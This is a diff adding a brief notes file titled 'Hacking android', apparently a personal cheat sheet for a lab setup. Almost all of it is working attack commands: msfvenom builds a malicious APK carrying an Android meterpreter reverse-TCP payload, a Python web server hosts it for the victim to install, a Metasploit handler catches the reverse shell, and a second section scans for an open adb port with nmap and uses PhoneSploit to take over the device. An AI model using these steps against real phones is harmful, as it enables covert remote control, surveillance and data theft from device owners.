@@ -1,0 +1,31 @@
+Hacking android:
+download from https://www.fosshub.com/Android-x86.html
+nomodeset xforcevesa
+
+msfvenom -l payloads | grep android
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.149.129 LPORT=4444 -f raw -o android.apk
+[serve the file.apk to android and install it which will give you a reverse shell]
+python3 -m http.server    [on the same folder you created the malicious file]
+
+msfconsole
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 192.168.149.129
+set LPORT 4444
+run
+
+192.168.149.129:8000    [on android machine]
+
+Hacking android using phonesploit:
+***Usb debugging mode & port 5555 should be open
+nmap -sV -p5555 -T4 192.168.149.139
+nmap -sS -p- -Pn 192.168.149.139
+
+apt install adb
+git clone https://github.com/aerosol-can/PhoneSploit
+cd PhoneSploit
+pip3 install colorama
+python3 phonesploit.py
+192.168.149.139
+4
+
